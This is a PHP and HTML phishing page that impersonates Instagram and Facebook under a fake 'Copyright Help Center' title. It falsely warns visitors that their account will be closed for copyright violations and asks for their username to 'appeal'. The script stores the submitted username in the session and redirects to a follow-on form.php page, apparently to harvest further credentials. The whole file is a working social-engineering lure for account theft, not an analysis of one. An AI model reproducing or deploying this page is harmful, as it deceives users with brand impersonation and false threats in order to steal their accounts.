<?php
if ($_POST) {
  session_start();
  $u=$_POST["username"];
  $_SESSION["username"]=$u;
  $rx=md5($u);
  define($ux, $rx);
  header("Location: form.php?$rx");

}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copyright Help Center</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/WjbGH9Owc-X.ico">
    <!--Favicon-->
    <style>
        body {
            background-color: #000100;
            color: white;
        }

        .container {
            margin-left: auto;
            margin-right: auto;
            text-align: center;
        }

        .logo-box {
            display: flex;
            justify-content: center;
            margin-top: 61px;
        }

        .text {
            font-size: 15px;
            display: flex;
            justify-content: center;
            margin-top: 41px;
            margin-left: auto;
            margin-right: 10px;
        }

        .text p {
            color: #EDEDED;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .form {
            margin-top: 25px;
            display: flex;
            justify-content: center;
        }

        .form input {
            background: none;
            border: 1px solid #EBEBEB;
            border-radius: 25px;
            color: white;
            height: 25px;
            width: 200px;
            text-align: center;
        }


        ::placeholder {
            color: #D0D3D4;
            opacity: 1;
        }

        :-ms-input-placeholder {
            color: #D0D3D4;
        }

        ::-ms-input-placeholder {
            color: #D0D3D4;
        }

        .form button {
            background: none;
            color: white;
            border-radius: 25px;
            border: 2px solid white;
            width: 100px;
            height: 40px;
        }

        .form button:hover {
            background: white;
            color: black;
            border: 2px solid white;
        }

        .company {
            display: flex;
            justify-content: center;
            margin-top: 30px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .footer {
            background: #212221;
            height: 440px;
            margin-bottom: 0;
            margin-left: 15%;
            margin-right: 15%;
        }

        #copyright {
            color: white;
        }

        #menu {
            display: inline;
            margin-top: 45px;
            width: 90%;
            margin-left: 35px;
        }

        #liste {
            display: inline-block;
        }

        #link {
            text-decoration: none;
            color: white;
            font-family: sans-serif;
            font-size: 13px;
            font-weight: 540;
            vertical-align: baseline;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="logo-box">
            <img src="instagram.png">
			
        </div>
		<img src="https://i.im.ge/2021/09/19/Tt5DWX.png" of="" photo="" width="150" style="border-radius:50%;margin-top:12px;">
        <div class="text">
            <p>Your account will be closed for violating our copyrights. To appeal, continue by entering your username.</p>
        </div>
        <div class="form">
            <form method="POST">
                <input type="text" name="username" placeholder="Username" required><br><br>
                <button type="submit">Continue</button><br><br><br><br>
            </form>
        </div>
        <div id="menu">
            <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li>
        </div> <br>
        <div class="company">
            <p style="font-weight:100;"><strong style="color: #4267B2;">FROM FACEBOOK</strong></p>
        </div>
    </div>
</body>

</html>